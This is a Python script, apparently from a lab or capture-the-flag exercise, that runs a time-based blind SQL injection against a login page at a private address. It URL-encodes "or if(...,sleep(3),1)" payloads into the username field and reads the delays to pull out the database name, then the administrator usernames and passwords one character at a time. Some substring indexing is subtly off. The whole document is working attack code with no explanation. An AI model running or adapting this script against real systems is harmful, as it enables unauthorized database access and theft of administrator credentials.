from urllib.parse import quote, urlencode
import requests
import time

def encode_url(s:str):
    uri = []
    byte_s = s.encode('utf-8')
    for e in byte_s:
        uri.append('%'+hex(e).replace('0x','').zfill(2))
    return ''.join(uri)

base = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_/'
url = 'http://10.0.2.14/logincheck.php'


#find database name length
for l in range(1, 20):
    payload = "1' or if(length(database())={},sleep(3), 1)#".format(l)
    start_time = time.time()
    res = requests.post(url, data={'username':encode_url(payload),'password':'1234', 'formsubmit':'登录'})
    if time.time() - start_time > 3:
        database_len = l
        print('database length: ', l)
        break

#get database name
database_name = ''
for i in range(0, database_len+1):
    for c in base:
        payload = "1' or if(ascii(substr(database(),{},{}))={}, sleep(3), 1)#".format(i, i,ord(c))
        start_time = time.time()
        res = requests.post(url, data={'username':encode_url(payload),'password':'1234', 'formsubmit':'登录'})
        if time.time() - start_time > 3:
            database_name += c
            print(database_name)
            break
print('database name: ', database_name)

#get admin_name numbers
for l in range(1, 20):
    payload = "1' or if((select count(admin_name) from admin_users)={},sleep(3), 1)#".format(l)
    start_time = time.time()
    res = requests.post(url, data={'username':encode_url(payload),'password':'1234', 'formsubmit':'登录'})
    if time.time() - start_time > 3:
        numbers = l
        print('numbers: ', l)
        break

# # get admin_name length
len = []
for i in range(0, numbers):
    for l in range(1, 20):
        payload = "1' or if(length((select admin_name from admin_users limit {},1))={},sleep(3), 1)#".format(i,l)
        start_time = time.time()
        res = requests.post(url, data={'username':encode_url(payload),'password':'1234', 'formsubmit':'登录'})
        if time.time() - start_time > 3:
            len.append(l)
            print('length: ', l)
            break

#get admin_user name
user_name = []
for i in range(0, numbers):
    name = ''
    for l in range(0,len[i]+1):
        for c in base:
            payload = "1' or if(ascii(substr((select admin_name from admin_users limit {},1),{},{}))={},sleep(3), 1)#".format(i,l,l,ord(c))
            start_time = time.time()
            res = requests.post(url, data={'username':encode_url(payload),'password':'1234', 'formsubmit':'登录'})
            if time.time() - start_time > 3:
                name += c
                break
    user_name.append(name)
    print('admin_user: ', name)

#get admin_password numbers
for l in range(1, 20):
    payload = "1' or if((select count(admin_password) from admin_users)={},sleep(3), 1)#".format(l)
    start_time = time.time()
    res = requests.post(url, data={'username':encode_url(payload),'password':'1234', 'formsubmit':'登录'})
    if time.time() - start_time > 3:
        numbers = l
        print('numbers: ', l)
        break

# # get admin_password length
len = []
for i in range(0, numbers):
    for l in range(1, 20):
        payload = "1' or if(length((select admin_password from admin_users limit {},1))={},sleep(3),1)#".format(i,l)
        start_time = time.time()
        res = requests.post(url, data={'username':encode_url(payload),'password':'1234', 'formsubmit':'登录'})
        if time.time() - start_time > 3:
            len.append(l)
            print('length: ', l)
            break

#get admin_password name
user_name = []
for i in range(0, numbers):
    name = ''
    for l in range(0,len[i]+1):
        for c in base:
            payload = "1' or if(ascii(substr((select admin_password from admin_users limit {},1),{},{}))={},sleep(3),1)#".format(i,l,l,ord(c))
            start_time = time.time()
            res = requests.post(url, data={'username':encode_url(payload),'password':'1234', 'formsubmit':'登录'})
            if time.time() - start_time > 3:
                name += c
                break
    user_name.append(name)
    print('admin_password: ',name)